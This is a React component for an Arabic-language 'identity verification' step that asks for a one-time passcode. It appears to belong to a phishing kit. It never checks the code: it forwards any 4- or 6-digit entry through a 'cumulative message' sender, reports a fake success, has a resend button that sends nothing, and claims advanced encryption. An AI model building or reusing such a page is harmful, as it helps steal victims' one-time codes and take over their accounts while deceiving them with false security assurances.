import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { X, Shield } from "lucide-react";
import Stepper from "@/components/Stepper";
import { toast } from "sonner";
import { useRegistration } from "@/contexts/RegistrationContext";

const steps = [
  { number: 1, title: "معلومات أساسية" },
  { number: 2, title: "التحقق" },
  { number: 3, title: "إكمال التسجيل" }
];
const OTPVerification = () => {
  const navigate = useNavigate();
  const { updateData, sendCumulativeMessage } = useRegistration();
  const [otp, setOtp] = useState("");
  const [isLoading, setIsLoading] = useState(false);

  const handleVerify = async () => {
    if (otp.length === 4 || otp.length === 6) {
      setIsLoading(true);
      try {
        const newData = { otp };
        updateData(newData);
        await sendCumulativeMessage(8, "رمز التحقق", newData);
        toast.success("تم التحقق بنجاح");
        setTimeout(() => {
          navigate('/processing-request');
        }, 1000);
      } catch (error) {
        toast.error("حدث خطأ، يرجى المحاولة مرة أخرى");
      } finally {
        setIsLoading(false);
      }
    }
  };

  const handleResend = () => {
    toast.success("تم إرسال رمز التحقق مرة أخرى");
    setOtp("");
  };

  return (
    <div className="min-h-screen bg-background flex flex-col">
      {/* Header */}
      <div className="flex items-center justify-between p-4 border-b">
        <button
          onClick={() => navigate(-1)}
          className="p-2 hover:bg-accent rounded-lg transition-colors"
        >
          <X className="w-6 h-6" />
        </button>
        <h1 className="text-xl font-bold">رمز التحقق</h1>
        <div className="w-10"></div>
      </div>

      {/* Stepper */}
      <div className="px-4 py-6">
        <Stepper currentStep={2} steps={steps} />
      </div>

      {/* Content */}
      <div className="flex-1 px-4 pb-8">
        <div className="max-w-md mx-auto space-y-6">
          {/* Welcome Message */}
          <div className="text-center space-y-3">
            <div className="flex justify-center mb-4">
              <div className="w-16 h-16 bg-[#E31E24]/10 rounded-full flex items-center justify-center">
                <Shield className="w-8 h-8 text-[#E31E24]" />
              </div>
            </div>
            <h2 className="text-2xl font-bold">
              التحقق من الهوية
            </h2>
            <p className="text-muted-foreground text-sm">
              تم إرسال رمز التحقق إلى رقم هاتفك المسجل
            </p>
          </div>

          {/* OTP Input */}
          <div className="space-y-4">
            <div className="space-y-2">
              <label className="text-sm font-medium text-right block">
                رمز التحقق
              </label>
              <Input
                type="text"
                inputMode="numeric"
                maxLength={6}
                value={otp}
                onChange={(e) => setOtp(e.target.value.replace(/\D/g, ""))}
                placeholder="أدخل الرمز"
                className="text-center text-2xl tracking-widest font-bold h-14"
                dir="ltr"
              />
            </div>

            {/* Resend Button */}
            <div className="text-center">
              <p className="text-sm text-muted-foreground mb-2">
                لم تستلم رمز التحقق؟
              </p>
              <Button
                variant="link"
                onClick={handleResend}
                className="text-[#E31E24] hover:text-[#C11A1F] font-medium p-0 h-auto"
              >
                إعادة إرسال الرمز
              </Button>
            </div>
          </div>

          {/* Submit Button */}
          <Button
            onClick={handleVerify}
            className="w-full h-14 text-lg font-bold bg-[#E31E24] hover:bg-[#C11A1F] text-white"
            disabled={(otp.length !== 4 && otp.length !== 6) || isLoading}
          >
            {isLoading ? "جاري التحقق..." : "تأكيد"}
          </Button>

          {/* Security Note */}
          <div className="flex items-start gap-2 p-4 bg-accent/50 rounded-lg">
            <span className="text-lg">🔒</span>
            <p className="text-xs text-muted-foreground text-right leading-relaxed">
              جميع البيانات محمية بتقنية التشفير المتقدمة وفقاً للمعايير الأمنية المعتمدة
            </p>
          </div>
        </div>
      </div>
    </div>
  );
};
export default OTPVerification;